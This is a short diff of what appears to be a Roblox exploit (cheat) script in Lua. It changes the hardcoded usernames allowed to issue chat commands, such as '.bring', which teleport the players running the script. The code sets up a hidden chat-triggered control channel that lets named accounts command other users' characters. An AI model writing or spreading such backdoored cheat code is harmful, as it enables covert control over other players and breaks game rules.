@@ -125,7 +125,7 @@ local function handleCommand(command, playerName)
             warn("Player not found!")
         end
     elseif command == ".bring" then
-        local owner = cmdp:FindFirstChild("izzkhalifahpro") or cmdp:FindFirstChild("izzkhalifahpro") or cmdp:FindFirstChild("CHEATING_B0SS")
+        local owner = cmdp:FindFirstChild("izzkhalifahpro") or cmdp:FindFirstChild("izzkhalifahpro") or cmdp:FindFirstChild("izzkhalifahpro")
         if owner and owner.Character and player.Character then
             local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
             local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
@@ -516,7 +516,7 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
     local sender = message.TextSource.Name
     local text = message.Text
 
-    if sender == "izzkhalifahpro" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" then
+    if sender == "izzkhalifahpro" or sender == "izzkhalifahpro" or sender == "izzkhalifahpro" or sender == "izzkhalifahpro" then
         local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
 
         if prefix and command then
